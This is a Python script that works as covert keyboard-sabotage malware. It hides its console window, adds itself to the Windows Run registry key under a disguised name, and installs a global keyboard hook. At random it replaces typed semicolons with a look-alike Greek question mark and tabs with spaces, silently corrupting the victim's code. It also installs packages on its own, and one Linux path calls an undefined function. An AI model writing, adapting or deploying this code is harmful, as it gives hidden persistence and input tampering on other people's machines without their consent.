import random
import os
import sys
import threading
import datetime,time
from sys import platform


from pynput import keyboard
from pynput.keyboard import Key, Controller
#Settings for windows computers
if platform == "win32":
    try:
        from pynput import keyboard
        from pynput.keyboard import Key, Controller
    except ImportError:
        os.system('pip install --user pynput')
        from pynput import keyboard
        from pynput.keyboard import Key, Controller
    try:
        import win32event, win32api, winerror
    except ImportError:
        os.system('pip install pypiwin32')
        import win32event, win32api, winerror
    try:
        from winreg import *
    except ImportError:
        os.system('pip install winreg')
        import winreg
    
    #Disallowing Multiple Instance
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        exit(0)

#Settings for linux INCOMPLETE
#if platform == "linux" or platform == "linux2":
#    pid = str(os.getpid())
#    pidfile = "/tmp/mydaemon.pid"
#
#    if os.path.isfile(pidfile):
#        sys.exit()
#    file(pidfile, 'w').write(pid)
#    #os.unlink(pidfile)


#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# Add to startup for windows
def addStartupWindows():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
            keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "totallylegitprogram",0,REG_SZ, new_file_path)

def on_release(key):
    pass

def on_press(key):
    try:
        if key.char == ';':
            if random.randint(0,20) == 5:
                keyboard = Controller()
                print("test")
                #keyboard.press(Key.backspace)
                #keyboard.release(Key.backspace)
                #keyboard.type(u'\b')
                if platform == "win32":
                    keyboard.type(u'\u037E')
                else:
                    keyboard.type('0x037E'.encode("UTF-16"))
                   # keyboard.press(Key.ctrl)
                   # keyboard.press(Key.shift)
                   # keyboard.press('u')
                   # keyboard.release('u')
                   # keyboard.press('0')
                   # keyboard.release('0')
                   # keyboard.press('3')
                   # keyboard.release('3')
                   # keyboard.press('7')
                   # keyboard.release('7')
                   # keyboard.press('E')
                   # keyboard.release('E')
                   # keyboard.release(Key.ctrl)
                   # keyboard.release(Key.shift)
                
        if key.char == '	':
            if random.randint(0,20) == 5:
                keyboard = Controller()
                keyboard.press(Key.backspace)
                keyboard.type("    ")
        #if key.char == 'q':
        #exit(0)
    except AttributeError:
        pass


def main():
    if platform == "win32":
        hide()
        addStartupWindows()
    #if platform == "linux" or platform == "linux2":
    if len(sys.argv)>1:
        hide()
        if sys.argv[1]=="startup":
            addStartup()     
    return True

if __name__ == '__main__':
    main()

# Collect events until released
with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
    listener.join()
